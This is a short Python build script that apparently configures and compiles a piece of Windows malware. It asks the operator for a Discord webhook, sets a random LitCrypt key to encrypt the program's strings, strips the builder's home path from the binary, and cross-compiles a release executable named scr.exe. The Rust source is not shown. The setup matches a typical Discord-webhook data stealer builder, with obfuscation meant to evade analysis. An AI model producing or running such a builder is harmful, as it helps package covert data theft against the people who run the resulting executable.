import random
import string
import subprocess
import os

def random_string(len: int) -> str:
    outstr = ""
    for _ in range(len):
        outstr += random.choice(string.ascii_letters)

    return outstr

os.environ["discord_webhook"] = input("Insert your Discord webhook: ") 

os.environ["LITCRYPT_ENCRYPT_KEY"] = random_string(130)
os.environ["RUSTFLAGS"] = "--remap-path-prefix $HOME=~"
subprocess.run(["cargo", "build", "-r", "--target", "x86_64-pc-windows-gnu"])
os.rename("target/x86_64-pc-windows-gnu/release/scr.exe", "./scr.exe")
